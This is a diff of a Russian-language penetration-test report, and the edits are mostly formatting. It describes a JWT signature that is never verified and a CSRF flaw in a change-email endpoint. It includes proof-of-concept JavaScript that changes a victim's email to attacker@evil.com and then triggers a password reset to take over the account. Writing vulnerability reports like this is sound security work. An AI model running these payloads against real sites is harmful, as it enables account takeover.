@@ -38,12 +38,14 @@
 - Критичности: High
 #### Описание
 Для авторизации действий (контроля доступа) API использует JWT (JSON Web Token) - токен авторизации, который указывается в Cookie в значении `session`.
+
 **Технические данные**:
 - Токен представлен в формате: `<header>.<body>.<signature>`, где `<signature> = xYz123`.
 - Используемый алгоритм: `HS256`.
 - Передаваемые в теле токена поля: `uid`, `username`, `role`.
 
 В приложении реализована некорректная проверка подписи JWT.
+
 В данном случае подпись статична и равна строке `xYz123`, из чего можно сделать вывод, что проверка не производится.
 
 Правильный вариант вычисления подписи (псевдокод):
@@ -138,18 +140,18 @@ Cookie: session=<DELETED>
 #### PoC
 1) Создать сайт со скриптом такого вида:
 
-```js
-let attackerMail = "attacker@evil.com";
-fetch('https://portal.targetcorp.com/api/v1/account/change-email', {
-		method: 'POST',
-		headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-		body: `new_email=${attackerMail}`,
-		credentials: 'include'
-	})
-.then(response => response.json())
-.then(data => console.log(data))
-.catch(error => console.error(error));
-```
+    ```js
+    let attackerMail = "attacker@evil.com";
+    fetch('https://portal.targetcorp.com/api/v1/account/change-email', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: `new_email=${attackerMail}`,
+            credentials: 'include'
+        })
+    .then(response => response.json())
+    .then(data => console.log(data))
+    .catch(error => console.error(error));
+    ```
 где `attacker@evil.com` - почта атакующего
 
 2) Заставить жертву кликнуть по ссылке с переходом на вредоносный сайт.
@@ -220,25 +222,25 @@ X-Powered-By: Express
 1) Создаем сайт, эксплуатирующий уязвимость CSRF при смене почты в `/api/v1/account/change-email`.
    Также добавляем на сайт логику, которая после смены почты отправит запрос на получение ссылки восстановления пароля через `/api/v1/account/reset-password`.
    Пример скрипта на странице:
-```js
-async function attack() {
-    let attackerMail = "attacker@evil.com";
-    await fetch('https://portal.targetcorp.com/api/v1/account/change-email', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: `new_email=${attackerMail}`,
-        credentials: 'include'
-    });
+    ```js
+    async function attack() {
+        let attackerMail = "attacker@evil.com";
+        await fetch('https://portal.targetcorp.com/api/v1/account/change-email', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: `new_email=${attackerMail}`,
+            credentials: 'include'
+        });
 
-    await fetch('https://portal.targetcorp.com/api/v1/account/reset-password', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ email: `${attackerMail}` })
-    });
-}
+        await fetch('https://portal.targetcorp.com/api/v1/account/reset-password', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ email: `${attackerMail}` })
+        });
+    }
 
-attack();
-```
+    attack();
+    ```
 
 2) Заставляем пользователя перейти на сайт.
 3) Переходим по ссылке на почте и меняем пароль.
